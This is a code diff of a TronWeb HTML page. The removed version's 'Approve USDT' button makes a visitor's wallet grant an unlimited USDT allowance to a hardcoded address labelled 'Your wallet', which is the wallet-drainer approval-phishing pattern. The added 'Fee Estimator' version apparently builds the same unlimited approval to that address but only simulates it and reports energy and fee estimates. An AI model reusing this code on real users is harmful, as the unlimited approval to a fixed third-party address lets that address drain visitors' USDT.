@@ -2,52 +2,63 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>TRC20 USDT Approval</title>
-  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-tronlink"></script>
+  <title>TRC20 Fee Estimator</title>
   <script src="https://cdn.jsdelivr.net/npm/tronweb@4.5.0/dist/TronWeb.js"></script>
 </head>
 <body>
-  <button id="approveBtn">Approve USDT</button>
+  <h2>USDT Approval Fee Estimator</h2>
+  <button onclick="estimateFee()">Estimate Approval Fee</button>
+  <pre id="result"></pre>
 
   <script>
     const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT Contract
-    const RECEIVER_ADDRESS = 'TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN'; // Your wallet
+    const SPENDER_ADDRESS = 'TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN'; // Your wallet
+    const MAX_UINT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-    const connectWallet = async () => {
-      if (window.tronWeb && window.tronWeb.ready) {
-        return window.tronWeb.defaultAddress.base58;
-      } else {
-        console.log("Waiting for TronLink...");
-        return new Promise(resolve => {
-          const check = setInterval(() => {
-            if (window.tronWeb && window.tronWeb.ready) {
-              clearInterval(check);
-              resolve(window.tronWeb.defaultAddress.base58);
-            }
-          }, 1000);
-        });
-      }
-    };
-
-    const approveUSDT = async () => {
-      const userAddress = await connectWallet();
-
+    async function estimateFee() {
       const tronWeb = window.tronWeb;
-      const usdtContract = await tronWeb.contract().at(CONTRACT_ADDRESS);
 
-      const amount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Max uint256
+      if (!tronWeb || !tronWeb.ready) {
+        document.getElementById('result').innerText = "Please open in Tron-compatible browser (TronLink, SafePal, OKX etc.)";
+        return;
+      }
+
+      const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
 
       try {
-        const tx = await usdtContract.approve(RECEIVER_ADDRESS, amount).send(); // 👈 No feeLimit passed
-        console.log("Approval TX:", tx);
-        alert("Approval Transaction Sent!");
-      } catch (err) {
-        console.error("Approval Error:", err);
-        alert("Approval Failed: " + err.message);
-      }
-    };
+        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+          CONTRACT_ADDRESS,
+          'approve(address,uint256)',
+          {},
+          [
+            { type: 'address', value: SPENDER_ADDRESS },
+            { type: 'uint256', value: MAX_UINT }
+          ],
+          tronWeb.defaultAddress.base58
+        );
 
-    document.getElementById('approveBtn').addEventListener('click', approveUSDT);
+        if (!tx || !tx.result || !tx.transaction) {
+          throw new Error("Simulation failed");
+        }
+
+        // Estimate Energy & Net Usage
+        const energyUsed = tx.result.energy_used || 0;
+        const netUsed = tx.result.net_used || 0;
+
+        // Calculate estimated TRX fee
+        const energyPrice = 420; // current TRON energy price in sun
+        const trxFee = (energyUsed * energyPrice + netUsed) / 1e6;
+
+        document.getElementById('result').innerText = `
+Energy Used: ${energyUsed}
+Net Used: ${netUsed}
+Estimated TRX Fee: ~${trxFee.toFixed(6)} TRX
+        `.trim();
+      } catch (err) {
+        document.getElementById('result').innerText = "Error: " + err.message;
+        console.error(err);
+      }
+    }
   </script>
 </body>
 </html>
